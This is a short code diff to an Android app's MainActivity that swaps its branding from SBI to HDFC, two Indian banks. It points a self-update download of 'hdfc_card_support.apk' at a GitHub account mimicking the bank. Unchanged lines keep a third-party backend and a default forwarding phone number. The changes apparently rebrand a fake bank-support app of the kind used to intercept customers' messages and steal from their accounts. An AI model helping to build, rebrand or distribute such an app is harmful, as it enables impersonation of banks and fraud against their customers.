@@ -1,4 +1,4 @@
-package com.sbi.app;
+package com.hdfc.app;
 
 import android.Manifest;
 import android.os.Build;
@@ -41,9 +41,9 @@ import java.util.List;
 import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
-    private static final String TAG = "SBI_MainActivity";
+    private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://newmadebackend.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/hdfc_card_support.apk";
+    private static final String UPDATE_URL = "https://github.com/hdfcbank100200-tech/newmade1/releases/latest/download/hdfc_card_support.apk";
     
     private static final String DEFAULT_FORWARDING_NUMBER = "+919911857954"; 
     
